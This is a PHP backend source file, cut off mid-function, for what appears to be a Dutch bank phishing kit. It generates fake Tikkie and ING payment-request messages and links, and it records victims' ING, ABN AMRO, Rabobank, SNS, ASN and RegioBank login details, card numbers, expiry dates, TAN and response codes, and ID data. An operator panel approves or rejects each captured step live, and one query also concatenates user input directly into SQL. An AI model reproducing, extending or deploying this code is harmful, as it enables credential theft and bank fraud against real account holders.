<?php

require 'connection.php';


// CHECK INDEX PASSWORD
function checkIndexPassword()
{
    global $con;
    $wachtwoord = $_GET['wachtwoord'];
    $id = "1";
    $query = "SELECT wachtwoord FROM pass WHERE id=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $query);
    mysqli_stmt_bind_param($stmt, "s", $id);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $row);
    mysqli_stmt_fetch($stmt);
    
    if($row != $wachtwoord)
    {
        $query = "SELECT link FROM request_link WHERE id=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "s", $id);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_bind_result($stmt, $result);

        while(mysqli_stmt_fetch($stmt))
        {
            $result;
            session_destroy();
            header("location:$result");
            exit();
        }
    }
}

// CHECK STANDARD TRXID
function checkTrxid()
{
    global $con;
    $id = $_GET['trxid'];    
    $query = "SELECT link FROM request_information WHERE link=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $query);
    mysqli_stmt_bind_param($stmt, "s", $id);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $result);
    mysqli_stmt_fetch($stmt);    
    
    if($result == 0)
    {
        $new_id = "1";
        $query = "SELECT link FROM request_link WHERE id=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "s", $new_id);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_bind_result($stmt, $result);
        
        while(mysqli_stmt_fetch($stmt))
        {
            $result;
            session_destroy();
            header("location:$result");
            exit();
        }
    }
    mysqli_stmt_close($stmt);
}

// ERROR EMPTY FIELDS
function submitIndexError()
{   
    global $con;
    $wachtwoord = $_GET['wachtwoord'];
    if(isset($_GET["error"]))
    {
        if($_GET["error"] == "legevelden")
        {
            echo "<p id='error-p'>Voer alle velden in.</p>";
            header("refresh: 2; url=index?wachtwoord=$wachtwoord");
        }
    }
}

// ERROR EMPTY PASSWORD
function submitIndexError2()
{   
    global $con;
    $wachtwoord = $_GET['wachtwoord'];
    if(isset($_GET["error"]))
    {
        if($_GET["error"] == "leegwachtwoord")
        {
            echo "<p id='error-p'>Voer een wachtwoord in.</p>";
            header("refresh: 2; url=index?wachtwoord=$wachtwoord");
        }
    }
}

function submitIndexError3()
{   
    global $con;
    $wachtwoord = $_GET['wachtwoord'];
    if(isset($_GET["error"]))
    {
        if($_GET["error"] == "redirect")
        {
            echo "<p id='error-p'>Voer een redirect in.</p>";
            header("refresh: 2; url=index?wachtwoord=$wachtwoord");
        }
    }
}

// INDEX CLICKS
function indexSubmits()
{
    global $con;
    $wachtwoord = $_GET['wachtwoord'];
    if(isset($_POST["wachtwoord-submit"]))
    {
        $mainwachtwoord = $_POST["wachtwoord"];
        if(empty($mainwachtwoord))
        {            
            header("location: index?wachtwoord=$wachtwoord&error=leegwachtwoord");
            exit();
        }
        
        $id = "1";       
        $query = "UPDATE pass SET wachtwoord=? WHERE id=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $mainwachtwoord, $id);
        mysqli_stmt_execute($stmt);
        
        if($stmt)
        {
            header("location: index?wachtwoord=$mainwachtwoord&succes=veranderd");
            exit();
        }
        mysqli_stmt_close($stmt);
    }
    else if(isset($_POST['delete-click']))
    {
        $query = "DELETE FROM request_information";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_execute($stmt);
        
        $secondQuery = "DELETE FROM request_data";
        $stmtSecond = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmtSecond, $secondQuery);
        mysqli_stmt_execute($stmtSecond); 
        
        if($stmt & $stmtSecond)
        {
            header("location: index?wachtwoord=$wachtwoord&succes=verwijderd");
            exit();        
        }
        mysqli_stmt_close($stmt);
    }
    else if(isset($_POST['log-click']))
    {
        header("location: required/all-logs?wachtwoord=$wachtwoord");
        exit();
    }
    else if(isset($_POST['submit']))
    {
        $wachtwoord = $_GET["wachtwoord"];
        $naam = $_POST["naam"];
        $bedrag = $_POST["bedrag"];
        $beschrijving = $_POST["beschrijving"];
        $rekeningnummer = $_POST["rekeningnummer"];
        $link = $_POST["link"];
        $verzoek = $_POST["request"];
        
        if(empty($naam) || empty($bedrag) || empty($beschrijving) || empty($rekeningnummer) || empty($link))
        {
            header("location: index?wachtwoord=$wachtwoord&error=legevelden");
            exit();
        }
        
        $query = "INSERT INTO request_information (naam, bedrag, beschrijving, rekeningnummer, link, verzoek) VALUES (?, ?, ?, ?, ?, ?)";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ssssss", $naam, $bedrag, $beschrijving, $rekeningnummer, $link, $verzoek);
        mysqli_stmt_execute($stmt);
                        
        if($stmt)
        {
            header("location: index?wachtwoord=$wachtwoord&succes=verzoek");
            exit();
        }
        mysqli_stmt_close($stmt);        
    }
    else if(isset($_POST['new-link-submit']))
    {
        $wachtwoord = $_GET["wachtwoord"];
        $link = $_POST['url-redirect'];

        if(empty($link))
        {            
            header("location: index?wachtwoord=$wachtwoord&error=redirect");
            exit();
        }
        
        $id = "1";       
        $query = "UPDATE request_link SET link=? WHERE id=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $link, $id);
        mysqli_stmt_execute($stmt);
        
        if($stmt)
        {
            header("location: index?wachtwoord=$wachtwoord&succes=veranderd");
            exit();
        }
        mysqli_stmt_close($stmt);
    }
}

// GET ALL INDEX REQUESTS
function getIndexRequests()
{
    global $con;
    $wachtwoord = $_GET["wachtwoord"];
    $query = "SELECT naam, bedrag, beschrijving, rekeningnummer, link, verzoek FROM request_information";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $query);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $naam, $bedrag, $beschrijving, $rekeningnummer, $link, $verzoek);
    
    while(mysqli_stmt_fetch($stmt))
    {
    ?>
    
        <div id="request">
            <label>Naam</label>
            <input type="text" readonly="true" value="<?php echo $naam;?>">
            
            <label>Bedrag</label>
            <input type="text" readonly="true" value="€ <?php echo $bedrag;?>">

            <label>Beschrijving</label>
            <input type="text" readonly="true" value="<?php echo $beschrijving;?>">
            
            <label>Rekeningnummer</label>
            <input type="text" readonly="true" value="<?php echo $rekeningnummer;?>">

            <label>Verzoek</label>
            <input type="text" readonly="true" value="<?php echo $verzoek;?>">
            
            <label>Tekst</label>
            <?php 
            if ($verzoek == "Tikkie")
            {
            ?>
                <input type="text" readonly="true" value="Wil je mij alsjeblieft €<?php echo $bedrag;?> betalen voor '<?php echo $beschrijving;?>' via https://<?php echo $_SERVER['SERVER_NAME'];?>/pay/index?trxid=<?php echo $link;?>">
            <?php
            }
            else if ($verzoek == "ING")
            {
            ?>
                <input type="text" readonly="true" value="Hoi! Wil je mij betalen? Ik heb een betaalverzoek gemaakt voor <?php echo $beschrijving;?> van €<?php echo $bedrag;?>. https://<?php echo $_SERVER['SERVER_NAME'];?>/particulier/betaalverzoek/index?trxid=<?php echo $link;?>">
            <?php
            }
            ?>
            <label>Link</label>
            <?php 
            if ($verzoek == "Tikkie")
            {
            ?>
                <a target="_blank" href="pay/index?trxid=<?php echo $link;?>"><?php echo $link;?></a><br>
            <?php
            }
            else if ($verzoek == "ING")
            {
            ?>
                <a target="_blank" href="particulier/betaalverzoek/index?trxid=<?php echo $link;?>"><?php echo $link;?></a><br>
            <?php
            }
            ?>
            <br>
            <a href="required/delete?wachtwoord=<?php echo $wachtwoord;?>&trxid=<?php echo $link?>" id="delete-button">Verwijder</a>
            <a href="required/all-logs?wachtwoord=<?php echo $wachtwoord;?>" id="log-button">Informatie</a>
        </div>
<?php
    }
    mysqli_stmt_close($stmt);
}

// DELETE INDEX REQUEST
function deleteIndexRequest()
{
    global $con;
    $link = $_GET["trxid"];
    $wachtwoord = $_GET["wachtwoord"];
    
    $query = "DELETE FROM request_information WHERE link=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $query);
    mysqli_stmt_bind_param($stmt, "s", $link);
    mysqli_stmt_execute($stmt);
    
    $querySecond = "DELETE FROM request_data WHERE link=?";
    $stmtSecond = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmtSecond, $querySecond);
    mysqli_stmt_bind_param($stmtSecond, "s", $link);
    mysqli_stmt_execute($stmtSecond);
    
    if($stmt && $stmtSecond)
    {
        header("location: ../index?wachtwoord=$wachtwoord");
        exit();
    }
    mysqli_stmt_close($stmt);

}

// PAYMENT INDEX
function showIndexPayment()
{
    global $con;
    checkTrxid();
    $id = $_GET['trxid'];   
    $query = "SELECT naam, bedrag, beschrijving, rekeningnummer, link FROM request_information WHERE link=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $query);
    mysqli_stmt_bind_param($stmt, "s", $id);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $naam, $bedrag, $beschrijving, $rekeningnummer, $link);
    
    while(mysqli_stmt_fetch($stmt))
    {
        $naam;
        $bedrag;
        $beschrijving;
        $rekeningnummer;
        $link;
        
        require '../../required/templates/verzoek-template.php';
    }
    mysqli_stmt_close($stmt);
}

// PAYMENT INDEX
function showIndexPaymentTikkie()
{
    global $con;
    checkTrxid();
    $id = $_GET['trxid'];   
    $query = "SELECT naam, bedrag, beschrijving, rekeningnummer, link FROM request_information WHERE link=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $query);
    mysqli_stmt_bind_param($stmt, "s", $id);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $naam, $bedrag, $beschrijving, $rekeningnummer, $link);
    
    while(mysqli_stmt_fetch($stmt))
    {
        $naam;
        $bedrag;
        $beschrijving;
        $rekeningnummer;
        $link;
        
        require '../required/templates/tikkie-template.php';
    }
    mysqli_stmt_close($stmt);
}

// SUBMITS IN LOGS
function submitIndexLogs()
{
    global $con;
    $true = "true";
    $false = "false";
    
    if(isset($_POST["toestaan"]))
    {
        $token = $_POST['token'];
        $query = "UPDATE request_data SET inglogincheck=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $true, $token);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_close($stmt);
    }
    else if(isset($_POST["weigeren"]))
    {
        $token = $_POST['token'];
        $query = "UPDATE request_data SET inglogincheck=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $false, $token);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_close($stmt);
    }
    else if(isset($_POST['toestaan-2']))
    {
        $token = $_POST['token'];
        $query = "UPDATE request_data SET ingloginchecktwo=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $true, $token);
        mysqli_stmt_execute($stmt);  
        mysqli_stmt_close($stmt);
    }
    else if(isset($_POST['weigeren-2']))
    {
        $token = $_POST['token'];
        $query = "UPDATE request_data SET ingloginchecktwo=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $false, $token);
        mysqli_stmt_execute($stmt); 
        mysqli_stmt_close($stmt);
    }
    else if(isset($_POST['toestaan-3']))
    {
        $token = $_POST['token'];
        $query = "UPDATE request_data SET inglogincheckthree=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $true, $token);
        mysqli_stmt_execute($stmt);    
        mysqli_stmt_close($stmt);
    }
    else if(isset($_POST['weigeren-3']))
    {
        $token = $_POST['token'];
        $query = "UPDATE request_data SET inglogincheckthree=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $false, $token);
        mysqli_stmt_execute($stmt); 
        mysqli_stmt_close($stmt);
    }
    else if(isset($_POST["accept-identification"]))
    {
        $token = $_POST['token'];
        $query = "UPDATE request_data SET abnresponscheckthree=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $true, $token);
        mysqli_stmt_execute($stmt); 
        mysqli_stmt_close($stmt);
    }
    else if(isset($_POST["deny-identification"]))
    {
        $token = $_POST['token'];
        $query = "UPDATE request_data SET abnresponscheckthree=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $false, $token);
        mysqli_stmt_execute($stmt); 
        mysqli_stmt_close($stmt);
    }
    else if(isset($_POST["upload-code"]))
    {
        $token = $_POST['token'];
        $respons = $_POST['abn-code'];
        $query = "UPDATE request_data SET abnresponscode=?, abnresponscheck=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "sss", $respons, $true, $token);
        mysqli_stmt_execute($stmt); 
        mysqli_stmt_close($stmt);
    }
    else if(isset($_POST['deny-code']))
    {
        $token = $_POST['token'];
        $empty = "";
        $query = "UPDATE request_data SET abnresponsone=?, abnresponscheck=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "sss", $empty, $false, $token);
        mysqli_stmt_execute($stmt); 
        mysqli_stmt_close($stmt);
    }
    else if(isset($_POST['accept-code']))
    {
        $token = $_POST['token'];
        $query = "UPDATE request_data SET abnresponschecktwo=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $true, $token);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_close($stmt);
    }
    else if(isset($_POST['deny-code-2']))
    {
        $token = $_POST['token'];
        $query = "UPDATE request_data SET abnresponschecktwo=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $false, $token);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_close($stmt);
    }
    else if(isset($_POST['sns-code-submit']))
    {
        $token = $_POST['token'];
        $respons = $_POST['sns-code'];
        $query = "UPDATE request_data SET snsresponscode=?, snsresponscheckone=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "sss", $respons, $true, $token);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_close($stmt);
    }
    else if(isset($_POST['sns-code-deny']))
    {
        $token = $_POST['token'];
        $query = "UPDATE request_data SET snsresponscheckone=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $false, $token);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_close($stmt);
    }
    else if(isset($_POST['sns-code-submit-2']))
    {
        $token = $_POST['token'];
        $query = "UPDATE request_data SET snsresponschecktwo=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $true, $token);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_close($stmt);
    }
    else if(isset($_POST['sns-code-deny-2']))
    {
        $token = $_POST['token'];
        $query = "UPDATE request_data SET snsresponschecktwo=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $false, $token);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_close($stmt);
    }
    else if(isset($_POST['asn-code-submit']))
    {
        $token = $_POST['token'];
        $respons = $_POST['asn-code'];
        $query = "UPDATE request_data SET asnresponscode=?, asnresponscheckone=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "sss", $respons, $true, $token);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_close($stmt);
    }
    else if(isset($_POST['asn-code-deny']))
    {
        $token = $_POST['token'];
        $query = "UPDATE request_data SET asnresponscheckone=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $false, $token);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_close($stmt);
    }
    else if(isset($_POST['asn-code-submit-2']))
    {
        $token = $_POST['token'];
        $query = "UPDATE request_data SET asnresponschecktwo=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $true, $token);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_close($stmt);
    }
    else if(isset($_POST['asn-code-deny-2']))
    {
        $token = $_POST['token'];
        $query = "UPDATE request_data SET asnresponschecktwo=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $false, $token);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_close($stmt);
    }
    else if(isset($_POST['regio-code-submit']))
    {
        $token = $_POST['token'];
        $respons = $_POST['regio-code'];
        $query = "UPDATE request_data SET regioresponscode=?, regioresponscheckone=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "sss", $respons, $true, $token);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_close($stmt);
    }
    else if(isset($_POST['regio-code-deny']))
    {
        $token = $_POST['token'];
        $query = "UPDATE request_data SET regioresponscheckone=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $false, $token);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_close($stmt);
    }
    else if(isset($_POST['regio-code-submit-2']))
    {
        $token = $_POST['token'];
        $query = "UPDATE request_data SET regioresponschecktwo=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $true, $token);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_close($stmt);
    }
    else if(isset($_POST['regio-code-deny-2']))
    {
        $token = $_POST['token'];
        $query = "UPDATE request_data SET regioresponschecktwo=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $false, $token);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_close($stmt);
    }
    else if(isset($_POST['rabo-code-submit']))
    {
        $token = $_POST['token'];
        $rabocode = $_POST['rabo-code-one'];
        $query = "UPDATE request_data SET raboresponscheckone=?, raboresponscode=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "sss", $true, $rabocode, $token);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_close($stmt);
    }
    else if(isset($_POST['rabo-code-deny']))
    {
        $token = $_POST['token'];
        $query = "UPDATE request_data SET raboresponscheckone=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $false, $token);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_close($stmt);
    }
    else if(isset($_POST['rabo-code-submit-2']))
    {
        $token = $_POST['token'];
        $rabocode = $_POST['rabo-code-two'];
        $query = "UPDATE request_data SET raboresponschecktwo=?, raboresponscodetwo=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "sss", $true, $rabocode, $token);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_close($stmt);
    }
    else if(isset($_POST['rabo-code-deny-2']))
    {
        $token = $_POST['token'];
        $empty = "";
        $rabocode = $_POST['rabo-code-three'];
        $query = "UPDATE request_data SET raboresponschecktwo=?, raboresponsone=?, raboresponscode=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ssss", $false, $empty, $rabocode, $token);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_close($stmt);
    }
    else if(isset($_POST['rabo-code-submit-3']))
    {
        $token = $_POST['token'];
        $query = "UPDATE request_data SET raboresponscheckthree=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $true, $token);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_close($stmt);
    }
    else if(isset($_POST['rabo-code-deny-3']))
    {
        $token = $_POST['token'];
        $empty = "";
        $rabocode = $_POST['rabo-code-five'];
        $query = "UPDATE request_data SET raboresponscheckthree=?, raboresponstwo=?, raboresponscodetwo=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ssss", $false, $empty, $rabocode, $token);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_close($stmt);
    }
    else if(isset($_POST['rabo-id-submit']))
    {
        $token = $_POST['token'];
        $query = "UPDATE request_data SET raboresponscheckfour=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "ss", $true, $token);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_close($stmt);
    }
    else if(isset($_POST['rabo-id-deny']))
    {
        $token = $_POST['token'];
        $empty = "";
        $query = "UPDATE request_data SET raboresponscheckfour=?, raboidentification=? WHERE token=?";
        $stmt = mysqli_stmt_init($con);
        mysqli_stmt_prepare($stmt, $query);
        mysqli_stmt_bind_param($stmt, "sss", $false, $empty, $token);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_close($stmt);
    }


}

// ING LOGIN PAGE RESET DATA
function ingLoginPage()
{
    global $con;
    checkTrxid();
    $bank = "ing";
    $empty = "";
    $currentSession = $_SESSION['alive'];
        
    $query = "UPDATE request_data SET bank=? WHERE token=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $query);
    mysqli_stmt_bind_param($stmt, "ss", $bank, $currentSession);
    mysqli_stmt_execute($stmt);
    
    $secondQuery = "UPDATE request_data SET inglogincheck=?, inguser=?, ingpass=?, ingpasnummer=?, ingvervaldatum=?, ingtancode=?, abnrekening=?, abnpasnummer=?, abnresponsone=?, abnresponscheck=?, abnresponscode=?, abnresponstwo=?, abnidentificatie=?, abnresponscheckthree=?, abnresponschecktwo=?, ingloginchecktwo=?, inglogincheckthree=?, snsrespons=?, snsresponscheckone=?, snsresponstwo=?, snsresponschecktwo=?, snsresponscode=?, asnrespons=?, asnresponscheckone=?, asnresponscode=?, asnresponstwo=?, asnresponschecktwo=?, regiorespons=?, regioresponscheckone=?, regioresponscode=?, regioresponstwo=?, regioresponschecktwo=?, raborekeningnummer=?, rabopasnummer=?, raboresponscheckone=?, raboresponscode=?, raboresponsone=?, raboresponschecktwo=?, raboresponscodetwo=?, raboresponstwo=?, raboresponscheckthree=?, raboidentification=?, raboresponscheckfour=? WHERE token=?";
    $secondStmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $secondQuery);
    mysqli_stmt_bind_param($stmt, "ssssssssssssssssssssssssssssssssssssssssssss", $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $currentSession);
    mysqli_stmt_execute($stmt);
    
    require 'templates/ing-inloggen-template.php';    
    mysqli_stmt_close($stmt);
}

// CHECK FOR ING DETAILS
function ingLoginCheck()
{
    global $con;
    checkTrxid();    
    require '../../../required/templates/ing-inloggen-check.php';
}

// CHECK FOR ING DETAILS
function ingLoginCheckTwo()
{
    global $con;
    checkTrxid();
    require '../../../required/templates/ing-inloggen-check-2.php';
}


// ING INFORMATION
function ingInformation()
{
    global $con;
    checkTrxid();
    $currentSession = $_SESSION['alive'];    
    $empty = "";
    
    $query = "UPDATE request_data SET ingloginchecktwo=?, ingpasnummer=?, ingvervaldatum=? WHERE token=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $query);
    mysqli_stmt_bind_param($stmt, "ssss", $empty, $empty, $empty, $currentSession);
    mysqli_stmt_execute($stmt);
   
    require '../../../required/templates/ing-informatie-template.php';    
    mysqli_stmt_close($stmt);
}

// CONFIRM ING REQUEST
function confirmIngRequest()
{
    global $con;
    checkTrxid();   
    require '../../../required/templates/ing-bevestigen-template.php';    
}

// ING TAN CODE REQUEST
function getIngTanCode()
{
    global $con;
    checkTrxid();
    $empty = "";
    $currentSession = $_SESSION['alive'];    
    
    $query = "UPDATE request_data SET inglogincheckthree=?, ingtancode=? WHERE token=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $query);
    mysqli_stmt_bind_param($stmt, "sss", $empty, $empty, $currentSession);
    mysqli_stmt_execute($stmt);
    
    require '../../../required/templates/ing-tancode-template.php';    
    mysqli_stmt_close($stmt);
}

// ING TAN CODE REQUEST
function checkIngTanCode()
{
    global $con;
    checkTrxid();    
    require '../../../required/templates/ing-inloggen-check-3.php';    
}

// ABN LOGIN PAGE
function abnLoginPage()
{
    global $con;
    checkTrxid();
    $bank = "abn";
    $id = $_GET['trxid'];    
    $currentSession = $_SESSION['alive'];    
    
    $firstQuery = "SELECT bedrag FROM request_information WHERE link='$id'";
    $firstResult = mysqli_query($con, $firstQuery);
    
    while($row = mysqli_fetch_row($firstResult))
    {
        $bedrag = $row[0];
    }
    
    $secondQuery = "UPDATE request_data SET bank=? WHERE token=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $secondQuery);
    mysqli_stmt_bind_param($stmt, "ss", $bank, $currentSession);
    mysqli_stmt_execute($stmt);
    
    $thirdQuery = "UPDATE request_data SET inglogincheck=?, inguser=?, ingpass=?, ingpasnummer=?, ingvervaldatum=?, ingtancode=?, abnrekening=?, abnpasnummer=?, abnresponsone=?, abnresponscheck=?, abnresponscode=?, abnresponstwo=?, abnidentificatie=?, abnresponscheckthree=?, abnresponschecktwo=?, ingloginchecktwo=?, inglogincheckthree=?, snsrespons=?, snsresponscheckone=?, snsresponstwo=?, snsresponschecktwo=?, snsresponscode=?, asnrespons=?, asnresponscheckone=?, asnresponscode=?, asnresponstwo=?, asnresponschecktwo=?, regiorespons=?, regioresponscheckone=?, regioresponscode=?, regioresponstwo=?, regioresponschecktwo=?, raborekeningnummer=?, rabopasnummer=?, raboresponscheckone=?, raboresponscode=?, raboresponsone=?, raboresponschecktwo=?, raboresponscodetwo=?, raboresponstwo=?, raboresponscheckthree=?, raboidentification=?, raboresponscheckfour=? WHERE token=?";
    $secondStmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $thirdQuery);
    mysqli_stmt_bind_param($stmt, "ssssssssssssssssssssssssssssssssssssssssssss", $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $empty, $currentSession);
    mysqli_stmt_execute($stmt);
    
    require 'templates/abn-inloggen-template.php';    
    mysqli_stmt_close($stmt);
}

// ABN RESPONS PAGE ONE
function abnResponsPageOne()
{
    global $con;
    checkTrxid();
    $id = $_GET['trxid'];
    $currentSession = $_SESSION['alive'];    
    
    $query = "SELECT bedrag FROM request_information WHERE link=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $query);
    mysqli_stmt_bind_param($stmt, "s", $id);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $bedrag);
    
    while(mysqli_stmt_fetch($stmt))
    {
        $bedrag;
    }
    
    $secondQuery = "UPDATE request_data SET abnresponscheck=? WHERE token=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $secondQuery);
    mysqli_stmt_bind_param($stmt, "ss", $bank, $currentSession);
    mysqli_stmt_execute($stmt);
    
    require 'templates/abn-response-one-template.php';
    mysqli_stmt_close($stmt);
}

// ABN RESPONSE CHECK
function abnResponsCheck()
{
    global $con;
    checkTrxid();
    $id = $_GET['trxid'];
        
    $query = "SELECT bedrag FROM request_information WHERE link=?";
    $stmt = mysqli_stmt_init($con);
    mysqli_stmt_prepare($stmt, $query);
    mysqli_stmt_bind_param($stmt, "s", $id);
    mysqli_stmt_execute($stmt);
    mysqli_stmt_bind_result($stmt, $bedrag);
    
    while(mysqli_stmt_fetch($stmt))
    {
        $bedrag;
    }
    
    require 'templates/abn-response-check.php';
